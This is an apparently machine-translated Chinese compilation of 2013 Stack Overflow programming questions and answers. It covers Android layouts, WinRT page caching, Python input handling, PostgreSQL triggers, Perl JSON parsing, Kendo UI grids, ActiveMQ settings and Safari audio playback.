我知道，这可能不是进行这种布局的最佳解决方案，而且我不希望您完全浏览这个长 XML 文件，但也许有人可以给我一个建议，告诉我如何更轻松地解决这个问题。

谢谢转发！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-12T09:24:49.333

使用 xml 布局来做到这一点需要做很多工作。我的意见是您创建一些自定义视图，并实现 onMeasure() 和 onDraw 方法。您可以在 onMeasure() 中设置视图高度，并在 onDraw() 方法中绘制这些点。有一个很好的实现你自己的自定义视图的教程
[http://developer.android.com/training/custom-views/index.html](http://developer.android.com/training/custom-views/index.html)

如果您真的想在 xml 布局中执行此操作，有一种方法：您可以通过以下方式获取屏幕的高度和宽度

```
Display display = getWindowManager().getDefaultDisplay(); 
int width = display.getWidth();  // deprecated
int height = display.getHeight();  // deprecated 
```

通过准确计算屏幕的宽度和高度，相应地设置布局中每个 imageView 的 LayoutParams。

# xaml - WinRT XAML 工具包预加载页面

> ID：15357151
> 
> 赞同：2
> 
> 时间：2013-03-12T09:10:27.677
> 
> 标签：xaml, windows-8, windows-runtime, winrt-xaml, winrt-xaml-toolkit

我有一个对 WinRT XAML Toolkit 的创建者有很大帮助的问题。
在 WinRT 中处理富页面的最佳机制是什么？

这些是条件：

1.  大约有 2 页在背景中有很多元素和一些高分辨率图像。显然，他们消耗时间来加载他们的内容。这就是我使用[`AlternativeFrame.Preload()`](http://winrtxamltoolkit.codeplex.com/SourceControl/changeset/view/9c814f6c67c5#WinRTXamlToolkit/Controls/AlternativeFrame/AlternativeFrame.cs)工具包中的方法的原因。
2.  这些页面也是最常用的。

这就是为什么我选择在需要时不断地预加载这些页面（创建、绘制、填充）或创建我自己的页面缓存来存储它们（也许我是盲人并且 Toolkit 已经具有此功能？）。
你能告诉我这个问题的最佳实践是什么，是否有第三种方法？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-12T21:48:22.257

添加更多背景信息 - WinRT XAML Toolkit 库有两个控件：它们是Windows 8 SDK 中开箱即用的基类和类的替代实现，用于处理 UI 导航 - 类似于您在 Web 中导航`AlternativeFrame`页面`AlternativePage`的`Frame`方式`Page`浏览器。这些替代控件的 API 与基本控件中的几乎相同，但它增加了对异步开发模型、页面转换动画和在请求之前预加载页面的更多支持。

目前，该`Preload()`方法在后台预加载给定类型的页面并将其放入缓存中，当`Navigate()`调用方法以导航到该类型的页面时 - 而不是实例化新页面 - 使用缓存中的页面，所以它可以立即显示，而且 - 缓存被清空，下次您想要导航到同一页面时 - 您需要再次预加载它。如果您不经常返回预加载页面并且该页面使用大量内存，则此方法效果很好，但如果您想将该页面保留在缓存中 - 没有内置支持。原始 Page 类有一个[NavigationCacheMode](http://msdn.microsoft.com/en-us/library/system.windows.controls.page.navigationcachemode%28v=VS.95%29.aspx)属性，该属性允许将页面配置为在第一次加载后保留在缓存中，这对您来说是一个不错的选择，但是`AlternativePage`还没有那个支持。由于我有空闲时间，我正在考虑将其添加到那里，因此您可能会决定等我做。其他选项包括

*   在导航框架顶部显示您的页面，而不是在框架中导航到它 - 然后您可以在需要时简单地显示/隐藏它
*   或者您可以切换回标准的框架/页面控件并设置`NavigationCacheMode="Required"`您的`Page`，以便它永远留在内存中，尽管您确实会失去该`Preload()`功能。
*   或者您可以自己修改工具包
*   或者您可以自己缓存页面的内容 - 只需将页面的内容保存`Content`在某种缓存中（例如`Dictionary<Type,UIElement>`，将页面类型映射到内容）并在您离开页面时将其从页面中删除（将 Content 设置为 null）页面，然后在您导航到该页面并在缓存中找到内容时将其添加回页面。在这种情况下，如果您从缓存中检索内容，您可能希望将其`Content`设为一个单独的`UserControl`并跳过`InitializeComponent()`构造函数中的调用，因为您只能拥有一个`Content`并且将其定义在一个单独的`UserControl`文件中将允许您获得自动生成的代码在其中执行，`InitializeComponent()`使您可以轻松访问命名元素、注册事件处理程序等。

# ios - 通过 UIWebView 实现 Google 自定义搜索

> ID：15357159
> 
> 赞同：2
> 
> 时间：2013-03-12T09:10:58.423
> 
> 标签：ios, objective-c, cocoa-touch

有没有办法在 iOS 应用程序中本地进行谷歌自定义搜索（不使用网络视图）？

现在，我在文档中看到的唯一 Google 搜索代码是 Javascript。

我还在这里找到了一个用于 Objective C 的 Google API，但我不明白这与自定义搜索有何关系。 [https://code.google.com/p/google-api-objectivec-client/](https://code.google.com/p/google-api-objectivec-client/)

**那么，谷歌自定义搜索可以在有或没有 UIWebView 的情况下实现吗？**

当然不会破坏谷歌的服务条款。:)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-01-23T15:16:56.980

您需要为您的应用调用谷歌自定义搜索网络服务。

查看此链接以获取更多信息

[https://developers.google.com/custom-search/](https://developers.google.com/custom-search/)

# jquery - 平滑 div 滚动条的不稳定行为

> ID：15357160
> 
> 赞同：0
> 
> 时间：2013-03-12T09:10:59.697
> 
> 标签：jquery, smooth-scrolling

我有一个网页，它使用 Smooth Div Scroll 来滚动使用 div 的产品目录。当显示的整个产品范围比页面宽时（实际上需要滚动时），滚动条效果很好，但是当范围较窄时，当您靠近左右热点时，它开始跳过和跳跃。此处显示了该行为的一个示例：

[http://www.iana.si/teme/tropical-energy-12m-4leta-tid596](http://www.iana.si/teme/tropical-energy-12m-4leta-tid596)

有人可以帮我弄清楚为什么会这样吗？

谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-12T15:25:36.107

我看到你正在使用 jQuery 1.4 min versiona 并且有一个

> TypeError: c.easing[a] 不是函数

尝试使用 jQuery 1.8

```
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.1/jquery.min.js" type="text/javascript"></script> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-13T07:31:32.093

Smooth Div Scroll 要求滚动条中的内容比滚动条本身宽。正如您所说，如果没有，则不需要滚动条。

我建议你重新考虑你的界面，或者使用选项和回调来编写一些在内容太短时禁用滚动条的代码。

# python - 字符串比较 - 未定义的值

> ID：15357163
> 
> 赞同：1
> 
> 时间：2013-03-12T09:11:16.887
> 
> 标签：python

有一些小程序要求输入 char - y,b,s，然后通过比较来检查输入是什么。
我运行程序时遇到的问题是-

> NameError：未定义名称“b”

如果输入是，比如说，b。
这是我的代码：

```
print("Please think of a number between 1 and 7")
print("Is it 4? (y,s,b)")
answer=char(input())

if (answer=='y'):
    print("It is Four!")

elif (answer=='s'):
    print("Is it 2? (y,s,b)")
    answer=input()
    if (answer=='y'):
        print("It is two!")
    elif (answer=='s'):
        print("It is one!")
    elif (answer=='b'):
        print("It is Three!")
elif (answer=='b'):
    print("Is it 6? (y,s,b)")
    answer=input()
    if (answer=='y'):
        print("It is Six!")
    elif (answer=='s'):
        print("It is Five!")
    elif (answer=='b'):
        print("It is Seven!") 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-12T09:12:11.513

由于您似乎使用的是 Python 2，因此您需要使用[`raw_input()`](http://docs.python.org/2/library/functions.html#raw_input)而不是[`input()`](http://docs.python.org/2/library/functions.html#input). 不同之处在于后者尝试评估您输入的表达式。例如，如果您输入`b`，它会查找名为 的变量`b`。

在 Python 3 中，没有`raw_input()`，`input()`也不再计算表达式。换句话说，Python3 的`input()`行为类似于 Python2 的`raw_input()`.

# postgresql - postgresql-使用触发器触发

> ID：15357164
> 
> 赞同：0
> 
> 时间：2013-03-12T09:11:22.713
> 
> 标签：postgresql, triggers, database

我想创建一个触发器，以便每当我进行更改（更新或删除）时，它都应该将旧数据复制到新表中（使用相同的模板）。

我试过这段代码：

```
create table restrictions(ID int,name text);

insert into restrictions values(122,'suresh');

select * from restrictions;

create table restrictions_deleted(ID int,name text);// this is my duplicate table for keeping information of all updations.

CREATE OR REPLACE FUNCTION moveDeleted() RETURNS trigger AS $$
    BEGIN
       INSERT INTO restrictions_deleted VALUES(OLD.ID, OLD.name);
       RETURN OLD;
    END;
$$ LANGUAGE plpgsql;

CREATE OR REPLACE TRIGGER moveDeleted
BEFORE DELETE ON restrictions 
FOR EACH ROW
EXECUTE PROCEDURE moveDeleted();

delete from restrictions where ID=122;
select * from restrictions_deleted; 
```

此代码能够将所有已删除的数据记录到重复表中。但我也想对更新做同样的事情。

有什么建议，有什么想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-12T09:58:43.367

首先-在触发功能中，您需要`RETURN NEW;`代替`RETURN OLD;`.

第二 - 将触发器更改为`BEFORE DELETE OR UPDATE`。

最后 - 最好有`AFTER DELETE OR UPDATE`一个日志记录触发器。这样，当更改回滚时，它就不会做无用的工作。

BTW[`here`](http://wiki.postgresql.org/wiki/Audit_trigger)是记录/审计触发器的一个很好的例子。

更新：

该函数将如下所示：

```
CREATE OR REPLACE FUNCTION moveDeleted() RETURNS trigger AS $$
    BEGIN
    IF (TG_OP = 'UPDATE') THEN
        INSERT INTO restrictions_deleted VALUES(OLD.ID, OLD.name);
        RETURN NEW;
    ELSIF (TG_OP = 'DELETE') THEN
        INSERT INTO restrictions_deleted VALUES(OLD.ID, OLD.name);
        RETURN OLD;
    END IF;
    END;
$$ LANGUAGE plpgsql; 
```

# android - 应用内计费 - 未安装 Play 商店应用时该怎么办？

> ID：15357168
> 
> 赞同：0
> 
> 时间：2013-03-12T09:11:32.200
> 
> 标签：android, in-app-purchase, google-play, billing

我将在我的应用中支持应用内计费/购买。

根据我的阅读，似乎必须在设备上安装 Play Store 应用才能进行应用内计费。我有 2 台 Android 设备进行测试。两者都缺少 Play 商店应用程序。我确信我的应用程序的用户会存在这种情况。

问题：当 Android 开发者的应用支持应用内计费但设备上未安装 Play 商店应用时，他们会怎么做？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-12T09:13:39.297

据我所知，如果他们没有市场，就没有办法做市场支付。

您可以查看市场是否[已安装](https://stackoverflow.com/questions/7482036/how-can-i-check-if-the-android-market-is-installed-on-my-users-device)，如果未安装，请提供明确的信息说明，可能包含有关如何获取它的说明，或者在 Web 浏览器中链接到其他支付方式（如贝宝）。

# json - 如何使用 PERL 从这个 JSON 对象中提取数据？

> ID：15357169
> 
> 赞同：-2
> 
> 时间：2013-03-12T09:11:33.070
> 
> 标签：json, perl, facebook-graph-api

我真的很难理解如何导航 JSON 对象。我正在使用 JSON.pm，我在桌子上敲打着头，试图访问每个“名称”参数并存储它的“值”数组的第一个索引。

我无法理解基本结构、数组/哈希引用的工作方式以及如何迭代它们以访问我需要的值。如果有人可以帮助我指出正确的方向……我现在很迷茫/困惑。

这是我正在使用的示例数据（Facebook 开放图形对象）。

```
{
  "data": [
    {
      "id": "219127134886593/insights/page_impressions/week",
      "name": "page_impressions",
      "period": "week",
      "values": [
        {
          "value": 31600,
          "end_time": "2013-03-07T08:00:00+0000"
        },
        {
          "value": 31979,
          "end_time": "2013-03-08T08:00:00+0000"
        },
        {
          "value": 29517,
          "end_time": "2013-03-09T08:00:00+0000"
        }
      ],
      "title": "Weekly Total Impressions",
      "description": "Weekly The number of impressions seen of any content associated with your Page. (Total Count)"
    },
    {
      "id": "219127134886593/insights/page_impressions_organic/week",
      "name": "page_impressions_organic",
      "period": "week",
      "values": [
        {
          "value": 23587,
          "end_time": "2013-03-07T08:00:00+0000"
        },
        {
          "value": 23858,
          "end_time": "2013-03-08T08:00:00+0000"
        },
        {
          "value": 22813,
          "end_time": "2013-03-09T08:00:00+0000"
        }
      ],
      "title": "Weekly Organic impressions",
      "description": "Weekly The number of times your posts were seen in News Feed or ticker or on visits to your Page. These impressions can be by people who have liked your Page and people who haven't. (Total Count)"
    },
  ],
  "paging": {
    "previous": "https://graph.facebook.com/219127134886593/insights/page_impressions,page_impressions_organic,page_impressions_viral,page_storytellers/week?since=1362383320&until=1362642520",
    "next": "https://graph.facebook.com/219127134886593/insights/page_impressions,page_impressions_organic,page_impressions_viral,page_storytellers/week?since=1362901720&until=1363160920"
  }
} 
```

这就是我正在努力访问不同元素的方法：

```
foreach my $data ( $decoded_json->{data} ) {
            foreach my $item ( @$data ) {
                $list{ $item->{'name'} } = $item->{'values'};
                print "Value 3: @($item->{'values'})[3]\n";
            }
        } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-12T10:07:27.983

```
for my $item (@{ $decoded_json->{data} }) {
    $list{ $item->{'name'} } = $item->{'values'};
    print "Value 4: $item->{'values'}[3]\n";
} 
```

有关参考的更多信息，请参见[http://p3rl.org/REF](http://p3rl.org/REF)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-12T10:08:38.453

成功！

```
foreach my $data ( $decoded_json->{data} ) {
    foreach my $item ( @$data ) {
        $list{ $item->{'name'} } = ${ $item->{'values'} }[1]->{'value'};
        print "Name: $item->{'name'}\n";
        print "Value 3: ${ $item->{'values'} }[1]->{'value'}\n";
    }
} 
```

感谢： [dispersiondesign.com](http://www.dispersiondesign.com/articles/perl/json_data) [thegeekstuff.com](http://www.thegeekstuff.com/2010/06/perl-array-reference-examples/)

谢谢大家，浓缩：

```
foreach my $item ( @{ $decoded_json->{data} } ) {
    $list{ $item->{'name'} } = $item->{'values'}->[1]->{'value'};
    print "Name: $item->{'name'}\n";
    print "Value 3: $item->{'values'}->[1]->{'value'}\n";
} 
```

# http - 如何从多部分 Http 请求中提取数据？

> ID：15357174
> 
> 赞同：0
> 
> 时间：2013-03-12T09:11:45.243
> 
> 标签：http, multipartform-data, http-protocols

我正在编写一个 HTTP 网络服务器。我的服务器必须处理 Http 多部分请求。在我之前的实现中，我借助请求的每个部分中存在的内容长度标头来提取数据。我使用的客户端在多部分请求中为每个部分（文件）提供内容长度标头。

但是另一个客户端没有给出每个文件的内容长度。在我的实现中，我使用 content-length 标头来提取那么多字节并将它们保存到文件中。

请告诉我现在如何提取数据。

我现在得到的标题是：

```
POST xxxxxxxxxxxxxxxxxxxxxxx&currentTab=PHOTOxxxxxxxxxxxxxxxx HTTP/1.1
Content-Length: 6829
Content-Type: multipart/form-data; boundary=SnlCg9JqTpQIl6t_mPzByTjZ8bD24kUj; charset=UTF-8
Host: host
Connection: Keep-Alive
User-Agent: Apache-HttpClient/xxxxxxxx
Accept-Encoding: gzip

--SnlCg9JqTpQIl6t_mPzByTjZ8bD24kUj
Content-Disposition: form-data; name="file"; filename="imagesCA5L2CL6_jpg(2)_jpg.jpg"
Content-Type: photo/jpg

**Some Data byte array**
--SnlCg9JqTpQIl6t_mPzByTjZ8bD24kUj-- 
```

在此请求中，部分数据中现在有 content-length 标头。

编辑：

早些时候，此客户端用于在每个部分中发送内容长度标头。但由于某种原因，它不再发送它了。任何人都可以提出任何理由。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-12T09:25:48.153

像这样：从 multipart/form-data POST 读取文件输入

[从 multipart/form-data POST 读取文件输入](https://stackoverflow.com/questions/7460088/reading-file-input-from-a-multipart-form-data-post)

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-03-12T09:17:25.953

如果您想实现 HTTP/1.1 服务器，请查看[RFC 2616 。](https://www.rfc-editor.org/rfc/rfc2616)有关如何确定消息长度的信息，请参见[第 4.4 节。](https://www.rfc-editor.org/rfc/rfc2616#section-4.4)请参阅[RFC 2388](https://www.rfc-editor.org/rfc/rfc2388)了解如何实现`multipart/form-data`。

真正的答案是：不要重新发明轮子，否则您将不得不重新实现几百页的 RFC。那里有大量的图书馆和服务器。

如果您确实想编写自己的 Web 服务器，例如作为练习，您应该已经找到了那些 RFC，对吧？

# typescript - 在类中声明一个函数

> ID：15357178
> 
> 赞同：0
> 
> 时间：2013-03-12T09:12:02.497
> 
> 标签：typescript

你如何在这样的类中声明一个函数

```
FooVariable = function FooFunction(FooMethod) {
} 
```

我正在尝试以这种方式而不是 FooFunction(FooMethod) 这样做，这样 FooFunction 就不会出现在原型中。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-12T09:25:31.363

如果您不想要这样的实例方法：

```
class Foo {
    fooFunction() {

    }
} 
```

您可以添加静态关键字：

```
class Foo {
    static fooFunction() {

    }
} 
```

生成的 JavaScript 是：

```
var Foo = (function () {
    function Foo() { }
    Foo.fooFunction = function fooFunction() {
    };
    return Foo;
})(); 
```

# ios - 具有自定义初始化的自定义 UIView 不起作用

> ID：15357181
> 
> 赞同：2
> 
> 时间：2013-03-12T09:12:07.557
> 
> 标签：ios, objective-c, uiview

我正在使用最新的 SDK 开发一个 iOS 应用程序。

我创建了一个继承自的类，`UIView`并且每次实例化该类时都必须进行一些初始化。

我必须调用一个方法，`setUpVars:`但我不知道在哪里向该方法发送消息：

```
- (id)initWithFrame:(CGRect)frame;
- (id)initWithCoder:(NSCoder*)aDecoder; 
```

此类可以与自定义 xib 一起使用，或添加到情节提要中，因此我需要确保在每种情况下都会调用该方法。

```
- (void)setUpVars
{
    _preferenceKey = @"";
    _preferenceStatus = NO;
    _isDown = NO;
} 
```

**我必须在哪里添加`[self setUpVars];`？**

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-12T09:53:25.843

基本上你会想要涵盖这两种情况

```
- (id)initWithFrame:(CGRect)frame;
{
  self = [super initWithFrame:frame];
  if (self) {
    [self setUpVars];
  }
  return self;
}

- (id)initWithCoder:(NSCoder *)aDecoder;
{
  self = [super initWithCoder:aDecoder];
  if (self) {
    [self setUpVars];
  }
  return self;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-12T09:23:46.247

如果您使用 Interface Builder 来设计您的界面，`initWithFrame`: 当您的视图对象随后从 nib 文件加载时不会被调用。而是`initWithCoder`被调用。因此，如果您更喜欢通用方式，则可以在这两种方法中初始化变量。适用于两种情况

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-12T09:24:54.977

文档说

> **从笔尖醒来**
> 
> 从 Interface Builder 存档或 nib 文件加载接收器后，准备接收器进行服务。

```
- (void)awakeFromNib
{
 [self setUpVars];
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-12T09:16:52.087

我认为您需要从每个方法发送此消息，也不要忘记`awakeFromNib`方法。

您可以创建`BOOL`变量，例如`isAlreadySetup`并将其设置为`YES`方法`setUpVars`。

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2013-03-12T09:21:16.903

我倾向于认为您应该从负责的控制器的 -(void)viewDidLoad 方法中调用此方法

# asp.net-mvc-4 - Kendo UI 网格工具栏模板下拉选择器错误（文本框而不是下拉菜单）

> ID：15357182
> 
> 赞同：0
> 
> 时间：2013-03-12T09:12:09.140
> 
> 标签：asp.net-mvc-4, kendo-grid

[示例](http://demos.kendoui.com/web/grid/toolbar-template.html) 我一直在研究如何让它工作，但到目前为止，我得到的不是下拉菜单，而是空的文本框，它什么都不做。

以下是我目前的代码： -

```
@section js {
<script type="text/x-kendo-template" id="template">
    <div class="toolbar">
        <label class="category-label" for="external">Show checks by ex:</label>
        <input type="search" id="external" style="width: 230px"></input>
    </div>
</script>
<script type="text/javascript">
    var theGrid;
    $().ready(function () {
        $('#listDiv').kendoGrid({
            dataSource: {
                type: 'json',
                serverPaging: true,
                pageSize: 10,
                transport: {
                    read: {
                        url: '@Url.Action("_IList", "Entry", new { @ExId = Model.ExId })',
                        data: { ignore: Math.random() }
                    }
                },
                schema: {
                    model: {
                        id: 'Id',
                        fields: {
                            Id: { type: 'number' },
                            Name: { type: 'string' },
                            Ex: { type: 'string' },
                            Date: { type: 'string' },
                            Check1: { type: 'string' },
                            Check2: { type: 'string' },
                            Check3: { type: 'string' },
                            Check4: { type: 'string' },
                            Check5: { type: 'string' },
                            Edit: { type: 'string' }
                        }
                    },
                    data: "Data",
                    total: "Count"
                }
            },
            scrollable: false,
            toolbar: kendo.template($("#template").html()),
            columns:
                [
                    {
                        field: 'Name'
                    },
                    {
                        field: 'Ex'
                    },
                    {
                        field: 'Date'
                    },
                    {
                        template: '#=Template1#' + sitePath + '#=Patient1#',
                        field: 'Patient1',
                        title: 'Patient 1',
                        width: 50
                    },
                    {
                        template: '#=Template2#' + sitePath + '#=Patient2#',
                        field: 'Patient2',
                        title: 'Patient 2',
                        width: 50
                    },
                    {
                        template: '#=Template3#' + sitePath + '#=Patient3#',
                        field: 'Patient3',
                        title: 'Patient 3',
                        width: 50
                    },
                    {
                        template: '#=Template4#' + sitePath + '#=Patient4#',
                        field: 'Patient4',
                        title: 'Patient 4',
                        width: 50
                    },
                    {
                        template: '#=Template5#' + sitePath + '#=Patient5#',
                        field: 'Patient5',
                        title: 'Patient 5',
                        width: 50
                    }

                ],
            pageable: true
        });
        var dropDown = grid.find("#external").kendoDropDownList({
            dataTextField: "ExName",
            dataValueField: "ExId",
            autoBind: false,
            optionLabel: "All",
            dataSource: {
                type: "json",
                severFiltering: true,
                transport: {
                    url: '@Url.Action("_Ex", "Entry")',
                    data: { ignore: Math.random() }
                }
            },
            change: function () {
                var value = this.value();
                if (value) {
                    grid.data("kendoGrid").dataSource.filter({ field: "ExId", operator: "eq", value: parseString(value) });
                } else {
                    grid.data("kendoGrid").dataSource.filter({});
                }
            }
        });
        theGrid = $('#listDiv').data('kendoGrid');
    });        
</script>
<style scoped="scoped">
    #grid .k-toolbar
    {
        min-height: 27px;
    }
    .external-label
    {
        vertical-align: middle;
        padding-right: .5em;
    }
    #external
    {
        vertical-align: middle;
    }
    .toolbar {
        float: right;
        margin-right: .8em;
    }
</style>
}
<h2>Check Lists</h2>

<div id="listDiv"></div>
<br /> 
```

它可以显示每个 Ex 的所有检查列表，我可以在上一页上选择这些检查列表并将字符串 Id 传递给这个，但我希望能够弄清楚工具栏模板有什么问题，因为它具有功能1 页而不是 2 页更可取。

任何帮助/指导将不胜感激。

编辑：

我也确实找到了遇到问题的其他人，只是他们没有得到论坛的回复。 [示例 2](http://www.kendoui.com/forums/ui/grid/dropdownlist-in-toolbar-showing-as-a-text-box-so-doesn-t-work.aspx)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-13T14:22:46.880

您提到其他人遇到了问题并且没有收到回复，但是链接的论坛帖子确实包含对此问题的回复和答案。在那种特殊情况下，页面上发生了 Javascript 错误，导致下拉菜单无法正确初始化，我相信您自己也是如此。

尽管由于没有有效的数据源而无法完全正常工作，但我将您的示例代码转储到[jsFiddle 中](http://jsfiddle.net/nukefusion/BXxGS/)，并且（在修复了一些 JS 错误之后）您可以看到下拉列表看起来非常好。

特别是，存在有关且未定义的错误`grid`，`sitePath`导致下拉列表无法初始化。

```
 var grid;
    var sitePath = '';
    $().ready(function () {
        grid = $('#listDiv').kendoGrid({
            dataSource: {
                type: 'json',
                serverPaging: true,
                pageSize: 10,
                transport: {
                    read: {
                        url: '',
                        data: { ignore: Math.random() }
                    }
                },
                schema: {
                    model: {
                        id: 'Id',
                        fields: {
                            Id: { type: 'number' },
                            Name: { type: 'string' },
                            Ex: { type: 'string' },
                            Date: { type: 'string' },
                            Check1: { type: 'string' },
                            Check2: { type: 'string' },
                            Check3: { type: 'string' },
                            Check4: { type: 'string' },
                            Check5: { type: 'string' },
                            Edit: { type: 'string' }
                        }
                    },
                    data: "Data",
                    total: "Count"
                }
            },
            scrollable: false,
            toolbar: kendo.template($("#template").html()),
            columns:
                [
                    {
                        field: 'Name'
                    },
                    {
                        field: 'Ex'
                    },
                    {
                        field: 'Date'
                    },
                    {
                        template: '#=Template1#' + sitePath + '#=Patient1#',
                        field: 'Patient1',
                        title: 'Patient 1',
                        width: 50
                    },
                    {
                        template: '#=Template2#' + sitePath + '#=Patient2#',
                        field: 'Patient2',
                        title: 'Patient 2',
                        width: 50
                    },
                    {
                        template: '#=Template3#' + sitePath + '#=Patient3#',
                        field: 'Patient3',
                        title: 'Patient 3',
                        width: 50
                    },
                    {
                        template: '#=Template4#' + sitePath + '#=Patient4#',
                        field: 'Patient4',
                        title: 'Patient 4',
                        width: 50
                    },
                    {
                        template: '#=Template5#' + sitePath + '#=Patient5#',
                        field: 'Patient5',
                        title: 'Patient 5',
                        width: 50
                    }

                ],
            pageable: true
        });
        var dropDown = grid.find("#external").kendoDropDownList({
            dataTextField: "ExName",
            dataValueField: "ExId",
            autoBind: false,
            optionLabel: "All",
            dataSource: {
                type: "json",
                severFiltering: true,
                transport: {
                    url: '@Url.Action("_Ex", "Entry")',
                    data: { ignore: Math.random() }
                }
            },
            change: function () {
                var value = this.value();
                if (value) {
                    grid.data("kendoGrid").dataSource.filter({ field: "ExId", operator: "eq", value: parseString(value) });
                } else {
                    grid.data("kendoGrid").dataSource.filter({});
                }
            }
        });
        theGrid = $('#listDiv').data('kendoGrid');
    }); 
```

# liferay - 解释继承的角色

> ID：15357192
> 
> 赞同：3
> 
> 时间：2013-03-12T09:12:36.037
> 
> 标签：liferay, roles, administration, inherited

继承的角色是如镜像所显示的角色：

![继承的角色图像](../Images/844934a346a7d59fb7b29fddf18edb04.png)

所以我的问题是：

1.  什么是继承角色？请解释。
2.  用户的此部分中将出现哪些角色的用例是什么？

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-12T13:36:29.803

您可以（例如）成为分配了角色的用户组的成员。这在用户个人资料上是不可编辑的，但是一个有效的角色很高兴看到它是否存在。其他“独立”角色（例如通过组织）也应该出现在此处。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2018-01-03T09:23:57.167

可以在以下位置配置继承的角色：控制面板 > 角色 > 选择特定角色 > 分配成员 > 选择站点选项卡

继承的角色

Liferay 中确实不存在继承的角色，但我们可以在用户我的帐户页面角色部分中看到这些角色。当用户可以是分配了角色的用户组的成员时，这些角色特别出现。

我们可以说，如果任何与用户组相关联的角色和用户是相应用户组的成员，那么角色可以作为继承角色部分的一部分可见。

简单地说，用户直接与角色无关，而不是用户组将与角色相关联，用户将成为用户组的成员，然后角色将成为属于用户组的用户的继承角色。

# java - 如何以及在何处检查某些 Apache Camel 设置

> ID：15357195
> 
> 赞同：1
> 
> 时间：2013-03-12T09:12:40.170
> 
> 标签：java, jms, activemq, apache-camel

我有一个基于 Camel 的应用程序，它使用以下路由向 ActiveMQ 实例发布/订阅消息/从 ActiveMQ 实例订阅消息：

```
<from uri="activemq:myQueue" /> 
```

或者：

```
<to uri="activemq:someOtherQueue" /> 
```

我正在尝试确定我是否无意中将我的应用程序设置为“同步模式”，这种情况发生在以下任一情况下：

*   `ActiveMQConnectionFactory#setAlwaysSyncSend`是真的; 或者
*   “ `MessageProducer`”设置为“持久”

我*相信*，没有骆驼，我通常会手动设置这些属性。在这里介绍 Camel 作为 ActiveMQ 客户端，不确定如何/去哪里找到这些属性的值。有任何想法吗？提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-12T10:35:36.740

您可以在添加组件时通过在传递给 ActiveMQ 组件的连接 URI 上设置这些值来配置这些值。Camel 网站上的此[文档](http://camel.apache.org/activemq.html)向您展示了它是如何完成的。

ActiveMQ 客户端通过在某些情况下选择使用异步而不是同步来进行一些自己的优化以提高发送性能。这[在此处记录](http://activemq.apache.org/async-sends.html)，值得一读。

因此，当您通过如下代码添加组件时，您将对其进行配置：

```
camelContext.addComponent("activemq", activeMQComponent("tcp://localhost:61616?jms.alwaysSyncSend=true")); 
```

[ActiveMQConnectionFactory 配置选项在此处](http://activemq.apache.org/connection-configuration-uri.html)详细记录，适用于传输的选项在[此处](http://activemq.apache.org/configuring-transports.html)

# javascript - 元素在 Safari 中根本不起作用

> ID：15357196
> 
> 赞同：2
> 
> 时间：2013-03-12T09:12:40.407
> 
> 标签：javascript, jquery, audio, safari

我正在尝试将音乐添加到我正在用 JS 和 jQuery 编写的虚拟旅游应用程序中，到目前为止，我的代码（如下所示）在 Chrome、FF、IE9 和 Opera 中运行良好。但是在 Safari 5.1.7 中，这是您可以在 Windows 机器上获得的最新版本，它只是无法正常工作......通过我对问题的研究，我知道 Safari 不会自动播放音乐，它必须启动手动，但是当我单击播放按钮时，什么也没有发生。而且，顺便说一句，Safari 中的代码检查器显示我的音频标签与音乐源一起存在，所以我认为它与 DOM 没有任何关系。对我的问题有任何想法吗？

**HTML**：

```
<div id="musicBtns">
    <p>Music:</p>
    <p id="musicPlayBtn">Play</p>
    <p>/</p>
    <p id="musicPauseBtn">Pause</p>
</div> 
```

**我在 JS 中的音乐对象**：

```
var Music = 
    {
        musicBtns: $('#musicBtns'),
        playBtn: $('#musicPlayBtn'),
        pauseBtn: $('#musicPauseBtn'),
        isPlaying: false,

        init: function()
        {
            if(!music.includeMusic) // If the client didn't want any music in the tour app, remove the music btns from the DOM
            {
                this.musicBtns.remove();
            }
            else // Else, setup the audio element
            {
                var parent = this;
                var audio = $('<audio loop="true">');

                if(music.autoplay) 
                {
                    audio.attr('autoplay', 'autoplay');
                    this.isPlaying = true;
                    this.togglePlayPause();
                }

                // Add a source elements and appends them to the audio element 
                this.addSource(audio, music.ogg); // 'music.ogg' is a reference to the path in a JSON file  
                this.addSource(audio, music.mp3);
                this.musicBtns.append(audio);

                // Add event listeners for the play/pause btns
                this.playBtn.click(function()
                {
                    audio.trigger('play');
                    parent.isPlaying = true;
                    parent.togglePlayPause();
                });

                this.pauseBtn.click(function()
                {
                    audio.trigger('pause');
                    parent.isPlaying = false;
                    parent.togglePlayPause();
                });
            }
        },
        addSource: function(el, path)
        {  
            el.append($('<source>').attr('src', path));  
        },
        // Add or remove classes depending on the state of play/pause
        togglePlayPause: function()
        {
            if(this.isPlaying)
            {
                this.playBtn.addClass('underline');
                this.pauseBtn.removeClass('underline');
            }
            else
            {
                this.playBtn.removeClass('underline');
                this.pauseBtn.addClass('underline');
            }
        }
    } 
```

**编辑：**这可能是 Safari 中的错误吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-13T10:33:39.760

所以问题出在 QuickTime 上。我想我必须不久前从我的机器上删除它，因为我认为我不需要它。重新安装 QuickTime 后，Safari 使用音频标签播放音乐没有问题。自动播放甚至也有效。

